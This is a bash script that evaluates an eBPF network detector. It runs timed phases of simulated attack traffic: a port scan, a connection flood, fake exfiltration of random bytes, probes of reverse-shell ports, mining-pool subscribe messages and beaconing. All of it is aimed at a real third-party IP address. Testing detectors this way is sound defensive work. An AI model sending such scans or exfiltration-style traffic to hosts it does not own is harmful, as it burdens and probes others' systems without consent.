#!/usr/bin/env bash
# single_session_eval.sh — ONE ebpf-cla process for the entire evaluation.
# Attack phases are injected while the process runs; labelled post-hoc by timestamp.
set -euo pipefail

IFACE="${1:-ens3}"
BINARY="/home/ubuntu/ebpf-cla/ebpf-cla"
OUTDIR="/home/ubuntu/ebpf-cla/results/raw"
CSV="$OUTDIR/single_$(date +%Y%m%d_%H%M%S).csv"
TIMELINE="$OUTDIR/single_timeline.txt"

echo "[single] CSV → $CSV"
echo "[single] Timeline → $TIMELINE"
> "$TIMELINE"

# Start ONE detector process, labelled "stream" (we'll relabel post-hoc)
sudo "$BINARY" "$IFACE" --csv "$CSV" --label stream \
    > /tmp/cla_single.log 2>&1 &
CLA_PID=$!
echo "[single] CLA PID=$CLA_PID"
sleep 3  # let BPF attach

log_phase() {
    local name="$1"
    echo "$(date +%H:%M:%S.%N) $name" >> "$TIMELINE"
    echo "[single] → $name"
}

# ── Phase 0: Benign baseline (120 s) ───────────────────────────────────
log_phase "BENIGN_START"
for i in $(seq 1 150); do
    curl -s -o /dev/null http://example.com 2>/dev/null || true
    sleep 0.5
done &
TRAFFIC_PID=$!
sleep 90
kill $TRAFFIC_PID 2>/dev/null; wait $TRAFFIC_PID 2>/dev/null || true
log_phase "BENIGN_END"
sleep 2

# ── Phase 1: Port Scan ───────────────────────────────────────────────────
log_phase "PORTSCAN_START"
python3 -c "
import socket
for port in range(1, 1025):
    try:
        s=socket.socket(); s.settimeout(0.05)
        s.connect(('93.184.216.34', port)); s.close()
    except: pass
print('scan done')
" 2>/dev/null
log_phase "PORTSCAN_END"
sleep 5

# ── Benign cooldown ─────────────────────────────────────────────────────
log_phase "BENIGN_START"
for i in $(seq 1 20); do curl -s -o /dev/null http://example.com 2>/dev/null||true; sleep 0.5; done
log_phase "BENIGN_END"
sleep 2

# ── Phase 2: SYN Flood ──────────────────────────────────────────────────
log_phase "SYNFLOOD_START"
python3 -c "
import socket
for _ in range(500):
    try:
        s=socket.socket(); s.settimeout(0.05)
        s.connect(('93.184.216.34', 80)); s.close()
    except: pass
" 2>/dev/null
log_phase "SYNFLOOD_END"
sleep 5

# ── Benign cooldown ─────────────────────────────────────────────────────
log_phase "BENIGN_START"
for i in $(seq 1 20); do curl -s -o /dev/null http://example.com 2>/dev/null||true; sleep 0.5; done
log_phase "BENIGN_END"
sleep 2

# ── Phase 3: Exfiltration ────────────────────────────────────────────────
log_phase "EXFIL_START"
python3 -c "
import socket, os, time
for _ in range(30):
    try:
        s=socket.socket(); s.settimeout(2.0)
        s.connect(('93.184.216.34', 80))
        s.sendall(b'POST / HTTP/1.0\r\nHost: x\r\nContent-Length: 16384\r\n\r\n' + os.urandom(4096))
        time.sleep(0.1); s.close()
    except: pass
" 2>/dev/null
log_phase "EXFIL_END"
sleep 5

# ── Benign cooldown ─────────────────────────────────────────────────────
log_phase "BENIGN_START"
for i in $(seq 1 20); do curl -s -o /dev/null http://example.com 2>/dev/null||true; sleep 0.5; done
log_phase "BENIGN_END"
sleep 2

# ── Phase 4: Privesc ────────────────────────────────────────────────────
log_phase "PRIVESC_START"
python3 -c "
import socket, subprocess
for i in range(80): subprocess.run(['id'], capture_output=True)
for port in [4444,1337,31337,9999,8888]*6:
    try:
        s=socket.socket(); s.settimeout(0.1)
        s.connect(('93.184.216.34', port)); s.close()
    except: pass
" 2>/dev/null
log_phase "PRIVESC_END"
sleep 5

# ── Phase 5: Cryptomining ───────────────────────────────────────────────
log_phase "CRYPTOMINING_START"
python3 -c "
import socket, time
for cycle in range(12):
    for port in [3333,4444,14444,45700]:
        try:
            s=socket.socket(); s.settimeout(0.5)
            s.connect(('93.184.216.34', port))
            s.sendall(b'{\"method\":\"mining.subscribe\"}\n')
            time.sleep(0.05); s.close()
        except: pass
    time.sleep(0.2)
" 2>/dev/null
log_phase "CRYPTOMINING_END"
sleep 5

# ── Phase 6: Rootkit beaconing ──────────────────────────────────────────
log_phase "ROOTKIT_START"
python3 -c "
import socket, time
for p in [7000,8000,9000,10000]:
    try: s=socket.socket(); s.settimeout(0.05); s.connect(('93.184.216.34',p)); s.close()
    except: pass
    time.sleep(0.05)
for _ in range(30):
    try: s=socket.socket(); s.settimeout(0.2); s.connect(('93.184.216.34',443)); s.close()
    except: pass
    time.sleep(0.3)
" 2>/dev/null
log_phase "ROOTKIT_END"

# Stop detector
sleep 3
sudo kill $CLA_PID 2>/dev/null; wait $CLA_PID 2>/dev/null || true; sleep 1

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[single] COMPLETE"
echo "[single] Events: $(tail -n +2 "$CSV" | wc -l)"
echo "[single] Timeline:"
cat "$TIMELINE"
echo ""
echo "CSV=$CSV"
echo "TIMELINE=$TIMELINE"
